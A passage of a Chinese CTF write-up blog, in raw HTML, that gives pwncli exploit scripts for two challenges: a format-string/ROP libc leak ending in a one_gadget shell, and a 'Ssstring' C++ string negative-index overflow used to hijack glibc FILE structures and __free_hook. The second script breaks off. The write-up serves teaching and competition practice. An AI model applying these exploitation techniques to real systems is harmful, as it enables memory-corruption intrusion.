+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;good luck</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">rl</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;a&#34;</span> <span class="o">*</span> <span class="mh">0x58</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">CurrentGadgets</span><span class="o">.</span><span class="n">ret</span><span class="p">())</span> <span class="o">*</span> <span class="mi">5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">fmt</span> 
+</span></span><span class="line"><span class="cl"><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;fmt</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span> <span class="s2">&#34;%7$s&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">8</span><span class="p">:</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x58</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">CurrentGadgets</span><span class="o">.</span><span class="n">ret</span><span class="p">())</span> <span class="o">*</span> <span class="mi">5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">fmt</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">recv_current_libc_addr</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;puts addr: &#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lb</span> <span class="o">=</span> <span class="n">LibcBox</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">lb</span><span class="o">.</span><span class="n">add_symbol</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">lb</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">download_so</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># download --&gt; libc6_2.23-0ubuntu11.2_amd64.so</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span>  <span class="n">lb</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;puts&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_adddr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">lb</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">lb</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">set_current_libc_base_and_log</span><span class="p">(</span><span class="n">libc_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ru</span><span class="p">(</span><span class="s2">&#34;fmt</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x78</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x4527a</span> <span class="o">+</span> <span class="n">libc_base</span><span class="p">,</span> <span class="c1"># one_gadget</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mh">0x20</span>
+</span></span><span class="line"><span class="cl">    <span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="n">sl</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ia</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最后测出来远程：<code>libc6_2.23-0ubuntu11.2_amd64</code>。</p>
+<p>远程：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423184352119.png' alt="image-20220423184352119"></p>
+<h2 class="heading-element" id="2-ssstring"><span>2 Ssstring</span>
+  <a href="#2-ssstring" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>不得不说，这次比赛的远程真的很很很很迷，本地环境应该和远程是一样的，但是总是打一半就卡死崩掉了。</p>
+<p>这题考查的是<code>C++</code>的<code>string</code>对象，也不算很难的题。<code>C++ string</code>对象的布局伪代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">string</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">capacity</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">refcount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">pad</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>初始状态下，<code>data</code>指针指向<code>pad</code>处。如果输入的字符串长度大于<code>0x10</code>，<code>string</code>对象的操作流程可以简单总结为：</p>
+<ul>
+<li>首先检查<code>data</code>是不是指向<code>pad</code>，如果是，就会调用<code>malloc</code>分配堆内存，存储输入的字符串</li>
+<li>如果<code>data</code>不指向<code>pad</code>：
+<ul>
+<li>如果输入的字符串长度大于<code>capacity</code>，释放<code>data</code>处的内存</li>
+<li>按照<code>0x40-&gt;0x80-&gt;0xf0-&gt;0x1e0-&gt;0x3e0...</code>的大小依次进行扩容，直到满足要求（所以一次性读取超过<code>0x400</code>长度的字符串，会在<code>tcachebins</code>里面发现很多<code>free chunk</code>）</li>
+</ul>
+</li>
+</ul>
+<h3 class="heading-element" id="checksec-1"><span>Checksec</span>
+  <a href="#checksec-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423222606174.png' alt="image-20220423222606174"></p>
+<p>远程<code>libc</code>版本为：<code>2.31-0ubuntu9.2_amd64</code></p>
+<h3 class="heading-element" id="漏洞点-1"><span>漏洞点</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e7%82%b9-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>程序不复杂，漏洞也很明显，在<code>change idx</code>的时候：</p>
+<p><img loading="lazy" src='https://image.roderickchan.cn/img/image-20220423222715414.png' alt="image-20220423222715414"></p>
+<p>输入的<code>idx</code>可以为负数，也就可以溢出修改<code>capacity</code>域以及<code>data</code>指针，虽然每次只能修改<code>1</code>个字节。</p>
+<h3 class="heading-element" id="利用思路-1"><span>利用思路</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>根据漏洞点整理利用思路如下：</p>
+<ul>
+<li>
+<p>第一次输入不超过<code>0x10</code>长度的字符串</p>
+</li>
+<li>
+<p>利用索引负数溢出修改掉<code>capacity</code>的值后，<code>cout&lt;&lt;str</code>即可泄露出栈上的<code>libc</code>地址以及栈地址</p>
+</li>
+<li>
+<p>继续利用溢出修改<code>capacity</code>大于<code>0x7f000000</code></p>
+</li>
+<li>
+<p>然后将<code>data</code>指向的地址的第<code>5</code>个字节修改成<code>libc</code>地址的第<code>5</code>个字节。比如说此时<code>data</code>的地址是一个栈地址<code>0x7ffdd10d5e90</code>，泄露出来的<code>libc</code>地址<code>0x7f7463afc000</code>，这里将<code>0x7ffdd10d5e90</code>修改为<code>0x7f74d10d5e90</code>，是为了方便修改<code>libc</code>上的数据</p>
+</li>
+<li>
+<p>计算想要修改的<code>libc</code>上的数据，和修改后的<code>data</code>之间的距离，一个字节一个字节修改即可</p>
+</li>
+<li>
+<p>这里我选择的思路是修改<code>IO_file_jumps</code>结构体和<code>stdout</code>结构体以及<code>__free_hook</code>，篡改<code>puts</code>的调用链，使得<code>_IO_file_xsputn</code>调用<code>_IO_str_finish</code>，调用<code>free(stdout-&gt;_IO_buf_base)</code>，实际调用<code>system(&quot;\nsh;&quot;)</code>即可获得<code>shell</code></p>
+</li>
+</ul>
+<h3 class="heading-element" id="exp-1"><span>EXP</span>
+  <a href="#exp-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/python3</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="n">timeout</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">input_str</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;string? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;char idx? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;char? </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sla</span><span class="p">(</span><span class="s2">&#34;&gt;&gt; &#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">input_str</span><span class="p">(</span><span class="s2">&#34;deadbeef&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="o">-</span><span class="mi">7</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">show</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">m</span> <span class="o">=</span> <span class="n">ru</span><span class="p">(</span><span class="s2">&#34;1. Cin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mh">0x40</span><span class="p">:</span><span class="mh">0x40</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__libc_start_main</span> <span class="o">-</span> <span class="mi">243</span>
+</span></span><span class="line"><span class="cl"><span class="n">set_current_libc_base_and_log</span><span class="p">(</span><span class="n">libc_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free_hook_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__free_hook</span>
+</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="n">file_jump_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x1ed4a0</span>
+</span></span><span class="line"><span class="cl"><span class="n">stdout_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span>
+</span></span><span class="line"><span class="cl"><span class="n">IO_str_finish</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x96ed0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="n">m</span><span class="p">[</span><span class="mh">0x50</span><span class="p">:</span><span class="mh">0x50</span><span class="o">+</span><span class="mi">8</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">string_ptr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x128</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_address</span><span class="p">(</span><span class="s2">&#34;string_ptr&#34;</span><span class="p">,</span> <span class="n">string_ptr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">input_str</span><span class="p">(</span><span class="s2">&#34;/bin/sh;deadbee&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="o">-</span><span class="mi">5</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">change</span><span class="p">(</span><span class="o">-</span><span class="mi">12</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">string_ptr</span> <span class="o">=</span> <span class="p">(</span><span class="n">string_ptr</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">|</span> <span class="p">((</span><span class="n">libc_base</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write IO_str_finish</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">file_jump_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_content</span> <span class="o">=</span> <span class="n">IO_str_finish</span>
+</span></span><span class="line"><span class="cl"><span class="n">dis</span> <span class="o">=</span> <span class="n">target_addr</span>  <span class="o">-</span> <span class="n">string_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;current distance: </span><span class="si">{</span><span class="n">dis</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="n">dis</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mh">0x80000000</span> <span class="ow">and</span> <span class="n">dis</span> <span class="o">&lt;</span> <span class="mh">0x7fffffff</span><span class="p">,</span> <span class="s2">&#34;try again&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">change</span><span class="p">(</span><span class="n">dis</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">p8_ex</span><span class="p">(</span><span class="n">write_content</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_content</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># write system</span>
+</span></span><span class="line"><span class="cl"><span class="n">target_addr</span> <span class="o">=</span> <span class="n">free_hook_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_content</span> <span class="o">=</span> <span class="n">system_addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">dis</span> <span class="o">=</span> <span class="n">target_addr</span>  <span class="o">-</span> <span class="n">string_ptr</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_ex</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;current distance: </span><span class="si">{</span><span class="n">dis</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
